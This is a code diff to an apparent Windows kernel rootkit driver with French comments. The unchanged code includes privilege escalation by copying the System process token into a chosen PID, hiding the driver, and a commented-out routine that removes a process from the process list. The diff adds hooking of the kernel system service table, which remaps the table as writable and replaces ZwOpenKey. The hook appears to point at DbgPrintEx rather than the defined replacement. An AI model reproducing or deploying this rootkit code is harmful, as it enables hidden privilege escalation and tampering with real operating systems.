@@ -92,6 +92,7 @@ int HideDriverSection(PDRIVER_OBJECT DriverObject) {
     DbgPrintEx(0, 0, "Driver should be hidden\n");
     return 1;
 }
+
 int ElevateSpecificPID(int targetPID) {
     PEPROCESS currentproc = PsGetCurrentProcess();//System
     PEX_FAST_REF Token = (PEX_FAST_REF)((unsigned char*)currentproc + 0x4B8);//Token offset
@@ -110,13 +111,76 @@ int ElevateSpecificPID(int targetPID) {
         DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
     }
     memcpy(((unsigned char*)pidEPROCESS + 0x4B8), Token, sizeof(PEX_FAST_REF));//normalement ça passe
+    //du 1er coup si ça c'est pas beau
     return 0;
+}
+
+
+//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm
+
+
+typedef struct ServiceDescriptorEntry {
+    unsigned int* ServiceTableBase;
+    unsigned int* ServiceCounterTableBase; //Used only in checked build
+    unsigned int NumberOfServices;
+    unsigned char* ParamTableBase;
+} ServiceDescriptorTableEntry_t, * PServiceDescriptorTableEntry_t;
+
+
+
+
+
+LARGE_INTEGER					m_UserTime;
+LARGE_INTEGER					m_KernelTime;
+
+typedef NTSYSAPI(*ZWOPENKEY)(
+    PHANDLE KeyHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes
+    );
+PMDL  g_pmdlSystemCall; // *MDL
+PVOID* MappedSystemCallTable;
+ZWOPENKEY OldregOpenKey;
+
+ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
+#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)] //prends une adresse éxportée par ntosrknl et renvoie l'adresse de la fonction exportée par la ssdt
+#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
+#define HOOK_SYSCALL(_Function, _Hook, _Orig )  _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
+
+#define UNHOOK_SYSCALL(_Function, _Hook, _Orig ) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
+
+
+
+
+
+NTSTATUS NewZwOpenKey(PHANDLE KeyHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes) {
+    DbgPrintEx(0, 0, "OpenKey hook !\n");
+    NTSTATUS Status;
+    Status = OldregOpenKey(KeyHandle, DesiredAccess, ObjectAttributes);
+    return Status;
+}
+int tryHook() {
+    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;//Initialise les variables de temps global à 0 et les syncro
+    OldregOpenKey = (ZWOPENKEY)(SYSTEMSERVICE(ZwOpenKey));
+    //Memory Descriptor List, alloue de la mémoire dans la nonpagedpool, avec les droits d'écriture (pour corrompre la SSDT)
+    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4);
+    if (!g_pmdlSystemCall) {
+        return STATUS_UNSUCCESSFUL;
+    }
+    //https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmbuildmdlfornonpagedpool
+    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
+
+    // Change l'autorisation de la page map
+    g_pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
+    MmMapLockedPagesSpecifyCache(g_pmdlSystemCall, KernelMode, MmNonCached/*on prend pas de risques*/, NULL, FALSE, 0);
+    HOOK_SYSCALL(ZwOpenKey,DbgPrintEx, OldregOpenKey);
+    return 1;
 }
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
-    ElevateSpecificPID(4524);
+    tryHook();
     //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "firefox.exe");
     //HideDriverSection(DriverObject);
     return STATUS_SUCCESS;
